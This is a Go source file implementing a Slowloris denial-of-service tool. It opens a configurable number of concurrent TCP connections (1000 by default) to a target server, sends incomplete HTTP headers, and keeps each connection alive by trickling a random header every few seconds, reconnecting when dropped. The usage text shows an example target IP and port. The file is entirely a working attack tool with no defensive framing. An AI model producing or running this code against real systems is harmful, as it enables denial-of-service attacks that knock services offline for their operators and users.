package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"sync"
	"time"
)

const timeOut = 3
const sleep = 5

var target = flag.String("t", "", "the ip address of the targeted machine")
var routines = flag.Int("r", 1000, "the number of concurent routines")
var wg sync.WaitGroup

var headers = []string{
	"GET / HTTP/1.1",
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"Accept-language: en-US,en,q=0.5",
	"Connection: Keep-Alive",
}

func usage() {
	fmt.Printf("You need to specify the ip of the target machine\n")
	fmt.Print("An example is -t http://195.17.56.213:8080 \n")
	flag.PrintDefaults()
}
func slowLoris(target string, indx int) {
	conn, err := net.DialTimeout("tcp", target, timeOut*time.Second)
	if err != nil {
		fmt.Println(err.Error())
		fmt.Printf("Couldn't connect to %s\n", target)
		wg.Done()
		return
	}
	for _, header := range headers {
		_, err = fmt.Fprintf(conn, header+"\r\n")
		if err != nil {
			fmt.Println(err.Error())
			fmt.Printf("{%v} Couldn't send the headers to the target", indx)
			wg.Done()
			return
		}
	}
	for {
		time.Sleep(sleep * time.Second)
		_, err := fmt.Fprintf(conn, "X-a: %v\r\n", rand.Intn(5000)+1)
		if err != nil {
			fmt.Println(err.Error())
			fmt.Printf("{%v} Couln't send data to the targe, trying reopening", indx)
			defer slowLoris(target, indx)
			return
		} else {
			fmt.Printf("{%v} Sending data\n", indx)
		}

	}

}
func main() {
	flag.Usage = usage
	flag.Parse()
	if flag.NArg() < 0 {
		fmt.Println("Insuficient arguments")
		flag.Usage()
		os.Exit(0)
	}
	fmt.Printf("Target: %s  Routines: %v\n", *target, *routines)
	u, _ := url.Parse(*target)
	for i := 1; i <= *routines; i++ {
		wg.Add(1)
		go slowLoris(u.Host, i)
	}
	wg.Wait()
}
